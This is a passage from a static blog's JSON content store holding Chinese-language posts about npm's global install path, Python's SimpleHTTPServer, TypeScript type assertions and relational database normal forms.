href=\"https://blog.csdn.net/ziyetian666/article/details/80493183\" target=\"_blank\" rel=\"noopener\">python-bridge</a></h2><h3 id=\"npm-Python-bridge\"><a href=\"#npm-Python-bridge\" class=\"headerlink\" title=\"npm: Python-bridge\"></a>npm: <a href=\"https://www.npmjs.com/package/python-bridge\" target=\"_blank\" rel=\"noopener\">Python-bridge</a></h3><h3 id=\"API-for-TypeScript\"><a href=\"#API-for-TypeScript\" class=\"headerlink\" title=\"API for TypeScript\"></a><a href=\"https://github.com/Submersible/node-python-bridge/blob/HEAD/README.ts.md\" target=\"_blank\" rel=\"noopener\">API for TypeScript</a></h3>"},{"title":"nodejs全局安装路径的位置","date":"2018-05-08T03:17:12.000Z","archives":"Node","_content":"一般nodejs安装在默认的C盘，如果不知道安装在哪里，可以打开控制面板-系统和安全-系统-高级配置中找到\n\n![变量路径](https://images2017.cnblogs.com/blog/1275872/201712/1275872-20171206153014909-1350443214.png)\n\n\n所谓全局安装：\n\n是指安装在`node`中`node_module`的根目录里，可以在电脑的任何位置调用这个方法。\n\n那么，如何在找到全局安装的位置呢？\n\n\n## <font color=#f00>方法一：</font>\n\n设置到自己想要放的位置：\n\n<font color=#f90 style='font-size:18px'>\n打开：nodejs安装目录/node_modules/npm/.npmrc这个文件，修改里面的路径\n\nprefix = E:\\nodejs\\npm_global_modules\n</font>\n\n## <font color=#f00>方法二：</font>\n使用快捷键 `win+R` ,输入cmd打开命令窗口，输入如下代码：\n\n````\n> npm config ls\n````\n\n![npm配置](https://images2017.cnblogs.com/blog/1275872/201712/1275872-20171206153727331-2045072377.png)\n\n<b style='font-size:18px'>\n其中：prefix=C:\\Users\\Administrator\\AppData\\Roaming\\npm就是我们全局安装了哪些方法的地方，如图：</b>\n\n![安装路径](https://images2017.cnblogs.com/blog/1275872/201712/1275872-20171206153926816-474788164.png)\n\n这时可以通过命令来更改路径\n\n````\nnpm config set prefix E:\\\n````\n\n-----------------------------\n\n[阅读原文](https://www.cnblogs.com/niuxiaoling/p/7993032.html)","source":"_posts/NodeJS/nodejs全局安装路径的位置.md","raw":"---\ntitle: nodejs全局安装路径的位置\ndate: 2018-05-08 11:17:12\ntags: Node全局路径\narchives: Node\ncategories: Node\n---\n一般nodejs安装在默认的C盘，如果不知道安装在哪里，可以打开控制面板-系统和安全-系统-高级配置中找到\n\n![变量路径](https://images2017.cnblogs.com/blog/1275872/201712/1275872-20171206153014909-1350443214.png)\n\n\n所谓全局安装：\n\n是指安装在`node`中`node_module`的根目录里，可以在电脑的任何位置调用这个方法。\n\n那么，如何在找到全局安装的位置呢？\n\n\n## <font color=#f00>方法一：</font>\n\n设置到自己想要放的位置：\n\n<font color=#f90 style='font-size:18px'>\n打开：nodejs安装目录/node_modules/npm/.npmrc这个文件，修改里面的路径\n\nprefix = E:\\nodejs\\npm_global_modules\n</font>\n\n## <font color=#f00>方法二：</font>\n使用快捷键 `win+R` ,输入cmd打开命令窗口，输入如下代码：\n\n````\n> npm config ls\n````\n\n![npm配置](https://images2017.cnblogs.com/blog/1275872/201712/1275872-20171206153727331-2045072377.png)\n\n<b style='font-size:18px'>\n其中：prefix=C:\\Users\\Administrator\\AppData\\Roaming\\npm就是我们全局安装了哪些方法的地方，如图：</b>\n\n![安装路径](https://images2017.cnblogs.com/blog/1275872/201712/1275872-20171206153926816-474788164.png)\n\n这时可以通过命令来更改路径\n\n````\nnpm config set prefix E:\\\n````\n\n-----------------------------\n\n[阅读原文](https://www.cnblogs.com/niuxiaoling/p/7993032.html)","slug":"NodeJS/nodejs全局安装路径的位置","published":1,"updated":"2018-05-09T06:07:04.953Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2ab003kb8xjb3sptzdd","content":"<p>一般nodejs安装在默认的C盘，如果不知道安装在哪里，可以打开控制面板-系统和安全-系统-高级配置中找到</p>\n<p><img src=\"https://images2017.cnblogs.com/blog/1275872/201712/1275872-20171206153014909-1350443214.png\" alt=\"变量路径\"></p>\n<p>所谓全局安装：</p>\n<p>是指安装在<code>node</code>中<code>node_module</code>的根目录里，可以在电脑的任何位置调用这个方法。</p>\n<p>那么，如何在找到全局安装的位置呢？</p>\n<h2 id=\"方法一：\"><a href=\"#方法一：\" class=\"headerlink\" title=\"方法一：\"></a><font color=\"#f00\">方法一：</font></h2><p>设置到自己想要放的位置：</p>\n<font color=\"#f90\" style=\"font-size:18px\"><br>打开：nodejs安装目录/node_modules/npm/.npmrc这个文件，修改里面的路径<br><br>prefix = E:\\nodejs\\npm_global_modules<br></font>\n\n<h2 id=\"方法二：\"><a href=\"#方法二：\" class=\"headerlink\" title=\"方法二：\"></a><font color=\"#f00\">方法二：</font></h2><p>使用快捷键 <code>win+R</code> ,输入cmd打开命令窗口，输入如下代码：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; npm config ls</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://images2017.cnblogs.com/blog/1275872/201712/1275872-20171206153727331-2045072377.png\" alt=\"npm配置\"></p>\n<p><b style=\"font-size:18px\"><br>其中：prefix=C:\\Users\\Administrator\\AppData\\Roaming\\npm就是我们全局安装了哪些方法的地方，如图：</b></p>\n<p><img src=\"https://images2017.cnblogs.com/blog/1275872/201712/1275872-20171206153926816-474788164.png\" alt=\"安装路径\"></p>\n<p>这时可以通过命令来更改路径</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm config set prefix E:\\</span><br></pre></td></tr></table></figure>\n<hr>\n<p><a href=\"https://www.cnblogs.com/niuxiaoling/p/7993032.html\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>一般nodejs安装在默认的C盘，如果不知道安装在哪里，可以打开控制面板-系统和安全-系统-高级配置中找到</p>\n<p><img src=\"https://images2017.cnblogs.com/blog/1275872/201712/1275872-20171206153014909-1350443214.png\" alt=\"变量路径\"></p>\n<p>所谓全局安装：</p>\n<p>是指安装在<code>node</code>中<code>node_module</code>的根目录里，可以在电脑的任何位置调用这个方法。</p>\n<p>那么，如何在找到全局安装的位置呢？</p>\n<h2 id=\"方法一：\"><a href=\"#方法一：\" class=\"headerlink\" title=\"方法一：\"></a><font color=\"#f00\">方法一：</font></h2><p>设置到自己想要放的位置：</p>\n<font color=\"#f90\" style=\"font-size:18px\"><br>打开：nodejs安装目录/node_modules/npm/.npmrc这个文件，修改里面的路径<br><br>prefix = E:\\nodejs\\npm_global_modules<br></font>\n\n<h2 id=\"方法二：\"><a href=\"#方法二：\" class=\"headerlink\" title=\"方法二：\"></a><font color=\"#f00\">方法二：</font></h2><p>使用快捷键 <code>win+R</code> ,输入cmd打开命令窗口，输入如下代码：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; npm config ls</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://images2017.cnblogs.com/blog/1275872/201712/1275872-20171206153727331-2045072377.png\" alt=\"npm配置\"></p>\n<p><b style=\"font-size:18px\"><br>其中：prefix=C:\\Users\\Administrator\\AppData\\Roaming\\npm就是我们全局安装了哪些方法的地方，如图：</b></p>\n<p><img src=\"https://images2017.cnblogs.com/blog/1275872/201712/1275872-20171206153926816-474788164.png\" alt=\"安装路径\"></p>\n<p>这时可以通过命令来更改路径</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm config set prefix E:\\</span><br></pre></td></tr></table></figure>\n<hr>\n<p><a href=\"https://www.cnblogs.com/niuxiaoling/p/7993032.html\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n"},{"title":"简单python服务器","date":"2018-06-08T07:44:31.000Z","_content":"## Python 2.7.14 SimpleHTTPServer\n````\npython -m SimpleHTTPServer 8000\n````\n\n这里的“Web服务器模块”有如下三种：\n\n`BaseHTTPServer`: 提供基本的Web服务和处理器类，分别是HTTPServer和BaseHTTPRequestHandler。\n\n`SimpleHTTPServer`: 包含执行GET和HEAD请求的SimpleHTTPRequestHandler类。\n\n`CGIHTTPServer`: 包含处理POST请求和执行CGIHTTPRequestHandler类。","source":"_posts/Python/简单python服务器.md","raw":"---\ntitle: 简单python服务器\ndate: 2018-06-08 15:44:31\ntags: python SimpleHTTPServer\ncategories: Python \n---\n## Python 2.7.14 SimpleHTTPServer\n````\npython -m SimpleHTTPServer 8000\n````\n\n这里的“Web服务器模块”有如下三种：\n\n`BaseHTTPServer`: 提供基本的Web服务和处理器类，分别是HTTPServer和BaseHTTPRequestHandler。\n\n`SimpleHTTPServer`: 包含执行GET和HEAD请求的SimpleHTTPRequestHandler类。\n\n`CGIHTTPServer`: 包含处理POST请求和执行CGIHTTPRequestHandler类。","slug":"Python/简单python服务器","published":1,"updated":"2018-06-09T09:34:54.398Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2ae003ob8xjurs58tyo","content":"<h2 id=\"Python-2-7-14-SimpleHTTPServer\"><a href=\"#Python-2-7-14-SimpleHTTPServer\" class=\"headerlink\" title=\"Python 2.7.14 SimpleHTTPServer\"></a>Python 2.7.14 SimpleHTTPServer</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python -m SimpleHTTPServer 8000</span><br></pre></td></tr></table></figure>\n<p>这里的“Web服务器模块”有如下三种：</p>\n<p><code>BaseHTTPServer</code>: 提供基本的Web服务和处理器类，分别是HTTPServer和BaseHTTPRequestHandler。</p>\n<p><code>SimpleHTTPServer</code>: 包含执行GET和HEAD请求的SimpleHTTPRequestHandler类。</p>\n<p><code>CGIHTTPServer</code>: 包含处理POST请求和执行CGIHTTPRequestHandler类。</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Python-2-7-14-SimpleHTTPServer\"><a href=\"#Python-2-7-14-SimpleHTTPServer\" class=\"headerlink\" title=\"Python 2.7.14 SimpleHTTPServer\"></a>Python 2.7.14 SimpleHTTPServer</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python -m SimpleHTTPServer 8000</span><br></pre></td></tr></table></figure>\n<p>这里的“Web服务器模块”有如下三种：</p>\n<p><code>BaseHTTPServer</code>: 提供基本的Web服务和处理器类，分别是HTTPServer和BaseHTTPRequestHandler。</p>\n<p><code>SimpleHTTPServer</code>: 包含执行GET和HEAD请求的SimpleHTTPRequestHandler类。</p>\n<p><code>CGIHTTPServer</code>: 包含处理POST请求和执行CGIHTTPRequestHandler类。</p>\n"},{"title":"TS断言","date":"2018-05-24T06:55:21.000Z","_content":"当出现一些类型无法被识别，或提示没有某些属性时，可以使用断言，进行`强制类型转换`\n\n````\n(this.$router as any)\n````","source":"_posts/TypeScript/TS断言.md","raw":"---\ntitle: TS断言\ndate: 2018-05-24 14:55:21\ntags: ts断言\ncategories: TS\n---\n当出现一些类型无法被识别，或提示没有某些属性时，可以使用断言，进行`强制类型转换`\n\n````\n(this.$router as any)\n````","slug":"TypeScript/TS断言","published":1,"updated":"2018-05-24T06:57:49.472Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2ag003rb8xjrxx2foto","content":"<p>当出现一些类型无法被识别，或提示没有某些属性时，可以使用断言，进行<code>强制类型转换</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(this.$router as any)</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<p>当出现一些类型无法被识别，或提示没有某些属性时，可以使用断言，进行<code>强制类型转换</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(this.$router as any)</span><br></pre></td></tr></table></figure>"},{"title":"关系数据库六大范式","date":"2018-06-25T06:17:53.000Z","_content":"","source":"_posts/SQL/关系数据库六大范式.md","raw":"---\ntitle: 关系数据库六大范式\ndate: 2018-06-25 14:17:53\ntags:\ncategories:\n---\n","slug":"SQL/关系数据库六大范式","published":1,"updated":"2018-06-25T06:18:24.751Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2ah003vb8xjblgkuixr","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"数据库范式介绍","date":"2018-05-02T05:50:37.000Z","archives":"SQL范式","_content":"# [关系数据库·范式介绍](http://josh-persistence.iteye.com/blog/2200644)\n\n## 一、基本介绍\n设计`关系数据库`时,遵从不同的规范要求,设计出合理的关系型数据库,这些不同的`规范`要求被称为不同的`范式`,各种范式`呈 递次规范`,越`高`的 范式 数据库`冗余越小`。\n\n目前关系数据库有`六种`范式:第一范式(1NF)、第二范式(2NF)、第三范式(3NF)、巴斯-科德范式(BCNF)、第四范式(4NF)和第五范式(5NF,又称完美范式)。满足最低要求的范式是第一范式(1NF)。在第一范式的基础上进一步满足更多规范要求的称为第二范式(2NF),其余范式以次类推。一般说来,数据库`只需满足第三范式(3NF)就行`了。\n\n范式的`包含关系`。一个数据库设计如果符合第二范式,一定也符合第一范式。如果符合第三范式,一定也符合第二范式…\n\n### **数据库基本概念**\n 要理解范式,首先必须对知道什么是`关系数据库`,简单的说:关系数据库就是用`二维表`来保存数据。表和表之间可以……(省略10W字),如果对数据库很熟悉,可以不用理会下面的概念。\n\n**实体**: 现实世界中客观存在并可以被区别的事物。比如“一个学生”、“一本书”、“一门课”等等。值得强调的是这里所说的“事物”不仅仅是看得见摸得着的“东西”，它也可以是虚拟的，不如说“老师与学校的关系”。\n\n**属性**: 教科书上解释为:“`实体所具有的某一特性`”，由此可见，属性一开始是个`逻辑概念`，比如说，“性别”是“人”的一个属性。在`关系数据库`中，属性又是个`物理概念`，属性可以看作是“`表的一列`”。\n\n**元组**：表中的一行就是一个元组。\n\n**分量**：`元组`的某个 `属性值`。在一个关系数据库中，它是一个`操作原子`，即关系数据库在做任何操作的时候，属性是“不可分的”。否则就不是关系数据库了。\n\n**码(键)**：表中可以唯一确定一个元组的某个 属性(或者属性组)，如果这样的码有不止一个，那么大家都叫 `候选码`，我们从候选码中挑一个出来做老大，它就叫`主码(主键)`。\n\n**全码**：如果一个码包含了所有的属性，这个码就是全码。\n\n**主属性**：一个属性只要在任何一个候选码中出现过，这个属性就是主属性。\n\n**非主属性**：与上面相反，没有在任何候选码中出现过，这个属性就是非主属性。\n\n**外码**：一个属性(或属性组)，它不是码，但是它别的表的码，它就是外码。\n\n**候选码**： 若关系中的某一属性或属性组的值能唯一的标识一个元组，而其任何真子集都不能再标识，则称该属性组为(超级码)候选码。\n\n#### [数据库，部分函数依赖，传递函数依赖，完全函数依赖，三种范式的区别](https://blog.csdn.net/rl529014/article/details/48391465)\n**函数依赖**: 设X,Y是关系R的两个属性集合,存在X→Y;则称Y 函数依赖于X。\n\n**部分函数依赖**：设X,Y是关系R的两个属性集合，存在X→Y; 若X’是X的`真子集`，存在X’→Y，则称Y 部分函数依赖于X。\n\n**完全函数依赖**：设X,Y是关系R的两个属性集合，X’是X的真子集，存在X→Y; X’是X的`真子集`，但对每一个X’都有X’!→Y，则称Y完全函数依赖于X。(个人理解为 只能通过 X确定 Y，并且每个X’ 都不能确定Y 的关系 就是完全函数依赖)\n\n**传递函数依赖**：设X,Y,Z是关系R中互不相同的属性集合，存在X→Y(Y !→X),Y→Z(Z !→Y)，则称Z传递函数依赖于X。\n\n假如 Z 函数依赖于 Y，且 Y 函数依赖于 X （『Y 不包含于 X，且 X 不函数依赖于 Y』这个前提），那么我们就称 Z 传递函数依赖于 X ，记作 X T→ Z，如图3。\n\n## 二、6种范式\n前面说到，`范式越高`，数据的`冗余`度`越小`。其实`没有冗余`的数据库设计是`可以做到`的。但是，`没有冗余`的数据库`未必是最好的`数据库，有时为了提高运行效率，就必须降低范式标准，适当保留冗余数据。具体做法是：在概念数据模型设计时遵守第三范式，降低范式标准的工作放到物理数据模型设计时考虑。降低范式就是增加字段，允许冗余。(最典型的就是在一些数据表中不仅存作为外键的user_id,同样存user_name,这样虽然违反数据库范式增加了user_name字段，但是却提高了效率，减少了获取user_id后再去user表中获取user name的操作)\n\n所以实际中，我们只需要考虑数据库满足第三范式就可以了,下面以最通俗的方式来解释数据库的范式。\n\n**第一范式(1NF)：属性不可分**\n\n(1NF是对属性的原子性约束，要求属性具有原子性，不可再分解)\n\n不满足第一范式的数据库，不是关系数据库！\n\n**第二范式（2NF）：符合1NF，并且非主属性完全依赖于码。**\n\n第二范式要求非主属性依赖于主关键字。\n\n（2NF是对记录的惟一性约束，要求记录有惟一标识，即实体的惟一性，更通俗说有主键ID）\n\n**第三范式（3NF）：符合2NF，并且，消除传递依赖。**\n（3NF是对字段冗余性的约束，即任何字段不能由其他字段派生出来，它要求字段没有冗余）\n\n","source":"_posts/SQL/数据库范式介绍.md","raw":"---\ntitle: 数据库范式介绍\ndate: 2018-05-02 13:50:37\ntags: SQL范式\narchives: SQL范式\ncategories: 数据库\n---\n# [关系数据库·范式介绍](http://josh-persistence.iteye.com/blog/2200644)\n\n## 一、基本介绍\n设计`关系数据库`时,遵从不同的规范要求,设计出合理的关系型数据库,这些不同的`规范`要求被称为不同的`范式`,各种范式`呈 递次规范`,越`高`的 范式 数据库`冗余越小`。\n\n目前关系数据库有`六种`范式:第一范式(1NF)、第二范式(2NF)、第三范式(3NF)、巴斯-科德范式(BCNF)、第四范式(4NF)和第五范式(5NF,又称完美范式)。满足最低要求的范式是第一范式(1NF)。在第一范式的基础上进一步满足更多规范要求的称为第二范式(2NF),其余范式以次类推。一般说来,数据库`只需满足第三范式(3NF)就行`了。\n\n范式的`包含关系`。一个数据库设计如果符合第二范式,一定也符合第一范式。如果符合第三范式,一定也符合第二范式…\n\n### **数据库基本概念**\n 要理解范式,首先必须对知道什么是`关系数据库`,简单的说:关系数据库就是用`二维表`来保存数据。表和表之间可以……(省略10W字),如果对数据库很熟悉,可以不用理会下面的概念。\n\n**实体**: 现实世界中客观存在并可以被区别的事物。比如“一个学生”、“一本书”、“一门课”等等。值得强调的是这里所说的“事物”不仅仅是看得见摸得着的“东西”，它也可以是虚拟的，不如说“老师与学校的关系”。\n\n**属性**: 教科书上解释为:“`实体所具有的某一特性`”，由此可见，属性一开始是个`逻辑概念`，比如说，“性别”是“人”的一个属性。在`关系数据库`中，属性又是个`物理概念`，属性可以看作是“`表的一列`”。\n\n**元组**：表中的一行就是一个元组。\n\n**分量**：`元组`的某个 `属性值`。在一个关系数据库中，它是一个`操作原子`，即关系数据库在做任何操作的时候，属性是“不可分的”。否则就不是关系数据库了。\n\n**码(键)**：表中可以唯一确定一个元组的某个 属性(或者属性组)，如果这样的码有不止一个，那么大家都叫 `候选码`，我们从候选码中挑一个出来做老大，它就叫`主码(主键)`。\n\n**全码**：如果一个码包含了所有的属性，这个码就是全码。\n\n**主属性**：一个属性只要在任何一个候选码中出现过，这个属性就是主属性。\n\n**非主属性**：与上面相反，没有在任何候选码中出现过，这个属性就是非主属性。\n\n**外码**：一个属性(或属性组)，它不是码，但是它别的表的码，它就是外码。\n\n**候选码**： 若关系中的某一属性或属性组的值能唯一的标识一个元组，而其任何真子集都不能再标识，则称该属性组为(超级码)候选码。\n\n#### [数据库，部分函数依赖，传递函数依赖，完全函数依赖，三种范式的区别](https://blog.csdn.net/rl529014/article/details/48391465)\n**函数依赖**: 设X,Y是关系R的两个属性集合,存在X→Y;则称Y 函数依赖于X。\n\n**部分函数依赖**：设X,Y是关系R的两个属性集合，存在X→Y; 若X’是X的`真子集`，存在X’→Y，则称Y 部分函数依赖于X。\n\n**完全函数依赖**：设X,Y是关系R的两个属性集合，X’是X的真子集，存在X→Y; X’是X的`真子集`，但对每一个X’都有X’!→Y，则称Y完全函数依赖于X。(个人理解为 只能通过 X确定 Y，并且每个X’ 都不能确定Y 的关系 就是完全函数依赖)\n\n**传递函数依赖**：设X,Y,Z是关系R中互不相同的属性集合，存在X→Y(Y !→X),Y→Z(Z !→Y)，则称Z传递函数依赖于X。\n\n假如 Z 函数依赖于 Y，且 Y 函数依赖于 X （『Y 不包含于 X，且 X 不函数依赖于 Y』这个前提），那么我们就称 Z 传递函数依赖于 X ，记作 X T→ Z，如图3。\n\n## 二、6种范式\n前面说到，`范式越高`，数据的`冗余`度`越小`。其实`没有冗余`的数据库设计是`可以做到`的。但是，`没有冗余`的数据库`未必是最好的`数据库，有时为了提高运行效率，就必须降低范式标准，适当保留冗余数据。具体做法是：在概念数据模型设计时遵守第三范式，降低范式标准的工作放到物理数据模型设计时考虑。降低范式就是增加字段，允许冗余。(最典型的就是在一些数据表中不仅存作为外键的user_id,同样存user_name,这样虽然违反数据库范式增加了user_name字段，但是却提高了效率，减少了获取user_id后再去user表中获取user name的操作)\n\n所以实际中，我们只需要考虑数据库满足第三范式就可以了,下面以最通俗的方式来解释数据库的范式。\n\n**第一范式(1NF)：属性不可分**\n\n(1NF是对属性的原子性约束，要求属性具有原子性，不可再分解)\n\n不满足第一范式的数据库，不是关系数据库！\n\n**第二范式（2NF）：符合1NF，并且非主属性完全依赖于码。**\n\n第二范式要求非主属性依赖于主关键字。\n\n（2NF是对记录的惟一性约束，要求记录有惟一标识，即实体的惟一性，更通俗说有主键ID）\n\n**第三范式（3NF）：符合2NF，并且，消除传递依赖。**\n（3NF是对字段冗余性的约束，即任何字段不能由其他字段派生出来，它要求字段没有冗余）\n\n","slug":"SQL/数据库范式介绍","published":1,"updated":"2018-06-25T06:28:18.767Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2aj003yb8xjonlr6lee","content":"<h1 id=\"关系数据库·范式介绍\"><a href=\"#关系数据库·范式介绍\" class=\"headerlink\" title=\"关系数据库·范式介绍\"></a><a href=\"http://josh-persistence.iteye.com/blog/2200644\" target=\"_blank\" rel=\"noopener\">关系数据库·范式介绍</a></h1><h2 id=\"一、基本介绍\"><a href=\"#一、基本介绍\" class=\"headerlink\" title=\"一、基本介绍\"></a>一、基本介绍</h2><p>设计<code>关系数据库</code>时,遵从不同的规范要求,设计出合理的关系型数据库,这些不同的<code>规范</code>要求被称为不同的<code>范式</code>,各种范式<code>呈 递次规范</code>,越<code>高</code>的 范式 数据库<code>冗余越小</code>。</p>\n<p>目前关系数据库有<code>六种</code>范式:第一范式(1NF)、第二范式(2NF)、第三范式(3NF)、巴斯-科德范式(BCNF)、第四范式(4NF)和第五范式(5NF,又称完美范式)。满足最低要求的范式是第一范式(1NF)。在第一范式的基础上进一步满足更多规范要求的称为第二范式(2NF),其余范式以次类推。一般说来,数据库<code>只需满足第三范式(3NF)就行</code>了。</p>\n<p>范式的<code>包含关系</code>。一个数据库设计如果符合第二范式,一定也符合第一范式。如果符合第三范式,一定也符合第二范式…</p>\n<h3 id=\"数据库基本概念\"><a href=\"#数据库基本概念\" class=\"headerlink\" title=\"数据库基本概念\"></a><strong>数据库基本概念</strong></h3><p> 要理解范式,首先必须对知道什么是<code>关系数据库</code>,简单的说:关系数据库就是用<code>二维表</code>来保存数据。表和表之间可以……(省略10W字),如果对数据库很熟悉,可以不用理会下面的概念。</p>\n<p><strong>实体</strong>: 现实世界中客观存在并可以被区别的事物。比如“一个学生”、“一本书”、“一门课”等等。值得强调的是这里所说的“事物”不仅仅是看得见摸得着的“东西”，它也可以是虚拟的，不如说“老师与学校的关系”。</p>\n<p><strong>属性</strong>: 教科书上解释为:“<code>实体所具有的某一特性</code>”，由此可见，属性一开始是个<code>逻辑概念</code>，比如说，“性别”是“人”的一个属性。在<code>关系数据库</code>中，属性又是个<code>物理概念</code>，属性可以看作是“<code>表的一列</code>”。</p>\n<p><strong>元组</strong>：表中的一行就是一个元组。</p>\n<p><strong>分量</strong>：<code>元组</code>的某个 <code>属性值</code>。在一个关系数据库中，它是一个<code>操作原子</code>，即关系数据库在做任何操作的时候，属性是“不可分的”。否则就不是关系数据库了。</p>\n<p><strong>码(键)</strong>：表中可以唯一确定一个元组的某个 属性(或者属性组)，如果这样的码有不止一个，那么大家都叫 <code>候选码</code>，我们从候选码中挑一个出来做老大，它就叫<code>主码(主键)</code>。</p>\n<p><strong>全码</strong>：如果一个码包含了所有的属性，这个码就是全码。</p>\n<p><strong>主属性</strong>：一个属性只要在任何一个候选码中出现过，这个属性就是主属性。</p>\n<p><strong>非主属性</strong>：与上面相反，没有在任何候选码中出现过，这个属性就是非主属性。</p>\n<p><strong>外码</strong>：一个属性(或属性组)，它不是码，但是它别的表的码，它就是外码。</p>\n<p><strong>候选码</strong>： 若关系中的某一属性或属性组的值能唯一的标识一个元组，而其任何真子集都不能再标识，则称该属性组为(超级码)候选码。</p>\n<h4 id=\"数据库，部分函数依赖，传递函数依赖，完全函数依赖，三种范式的区别\"><a href=\"#数据库，部分函数依赖，传递函数依赖，完全函数依赖，三种范式的区别\" class=\"headerlink\" title=\"数据库，部分函数依赖，传递函数依赖，完全函数依赖，三种范式的区别\"></a><a href=\"https://blog.csdn.net/rl529014/article/details/48391465\" target=\"_blank\" rel=\"noopener\">数据库，部分函数依赖，传递函数依赖，完全函数依赖，三种范式的区别</a></h4><p><strong>函数依赖</strong>: 设X,Y是关系R的两个属性集合,存在X→Y;则称Y 函数依赖于X。</p>\n<p><strong>部分函数依赖</strong>：设X,Y是关系R的两个属性集合，存在X→Y; 若X’是X的<code>真子集</code>，存在X’→Y，则称Y 部分函数依赖于X。</p>\n<p><strong>完全函数依赖</strong>：设X,Y是关系R的两个属性集合，X’是X的真子集，存在X→Y; X’是X的<code>真子集</code>，但对每一个X’都有X’!→Y，则称Y完全函数依赖于X。(个人理解为 只能通过 X确定 Y，并且每个X’ 都不能确定Y 的关系 就是完全函数依赖)</p>\n<p><strong>传递函数依赖</strong>：设X,Y,Z是关系R中互不相同的属性集合，存在X→Y(Y !→X),Y→Z(Z !→Y)，则称Z传递函数依赖于X。</p>\n<p>假如 Z 函数依赖于 Y，且 Y 函数依赖于 X （『Y 不包含于 X，且 X 不函数依赖于 Y』这个前提），那么我们就称 Z 传递函数依赖于 X ，记作 X T→ Z，如图3。</p>\n<h2 id=\"二、6种范式\"><a href=\"#二、6种范式\" class=\"headerlink\" title=\"二、6种范式\"></a>二、6种范式</h2><p>前面说到，<code>范式越高</code>，数据的<code>冗余</code>度<code>越小</code>。其实<code>没有冗余</code>的数据库设计是<code>可以做到</code>的。但是，<code>没有冗余</code>的数据库<code>未必是最好的</code>数据库，有时为了提高运行效率，就必须降低范式标准，适当保留冗余数据。具体做法是：在概念数据模型设计时遵守第三范式，降低范式标准的工作放到物理数据模型设计时考虑。降低范式就是增加字段，允许冗余。(最典型的就是在一些数据表中不仅存作为外键的user_id,同样存user_name,这样虽然违反数据库范式增加了user_name字段，但是却提高了效率，减少了获取user_id后再去user表中获取user name的操作)</p>\n<p>所以实际中，我们只需要考虑数据库满足第三范式就可以了,下面以最通俗的方式来解释数据库的范式。</p>\n<p><strong>第一范式(1NF)：属性不可分</strong></p>\n<p>(1NF是对属性的原子性约束，要求属性具有原子性，不可再分解)</p>\n<p>不满足第一范式的数据库，不是关系数据库！</p>\n<p><strong>第二范式（2NF）：符合1NF，并且非主属性完全依赖于码。</strong></p>\n<p>第二范式要求非主属性依赖于主关键字。</p>\n<p>（2NF是对记录的惟一性约束，要求记录有惟一标识，即实体的惟一性，更通俗说有主键ID）</p>\n<p><strong>第三范式（3NF）：符合2NF，并且，消除传递依赖。</strong><br>（3NF是对字段冗余性的约束，即任何字段不能由其他字段派生出来，它要求字段没有冗余）</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"关系数据库·范式介绍\"><a href=\"#关系数据库·范式介绍\" class=\"headerlink\" title=\"关系数据库·范式介绍\"></a><a href=\"http://josh-persistence.iteye.com/blog/2200644\" target=\"_blank\" rel=\"noopener\">关系数据库·范式介绍</a></h1><h2 id=\"一、基本介绍\"><a href=\"#一、基本介绍\" class=\"headerlink\" title=\"一、基本介绍\"></a>一、基本介绍</h2><p>设计<code>关系数据库</code>时,遵从不同的规范要求,设计出合理的关系型数据库,这些不同的<code>规范</code>要求被称为不同的<code>范式</code>,各种范式<code>呈 递次规范</code>,越<code>高</code>的 范式 数据库<code>冗余越小</code>。</p>\n<p>目前关系数据库有<code>六种</code>范式:第一范式(1NF)、第二范式(2NF)、第三范式(3NF)、巴斯-科德范式(BCNF)、第四范式(4NF)和第五范式(5NF,又称完美范式)。满足最低要求的范式是第一范式(1NF)。在第一范式的基础上进一步满足更多规范要求的称为第二范式(2NF),其余范式以次类推。一般说来,数据库<code>只需满足第三范式(3NF)就行</code>了。</p>\n<p>范式的<code>包含关系</code>。一个数据库设计如果符合第二范式,一定也符合第一范式。如果符合第三范式,一定也符合第二范式…</p>\n<h3 id=\"数据库基本概念\"><a href=\"#数据库基本概念\" class=\"headerlink\" title=\"数据库基本概念\"></a><strong>数据库基本概念</strong></h3><p> 要理解范式,首先必须对知道什么是<code>关系数据库</code>,简单的说:关系数据库就是用<code>二维表</code>来保存数据。表和表之间可以……(省略10W字),如果对数据库很熟悉,可以不用理会下面的概念。</p>\n<p><strong>实体</strong>: 现实世界中客观存在并可以被区别的事物。比如“一个学生”、“一本书”、“一门课”等等。值得强调的是这里所说的“事物”不仅仅是看得见摸得着的“东西”，它也可以是虚拟的，不如说“老师与学校的关系”。</p>\n<p><strong>属性</strong>: 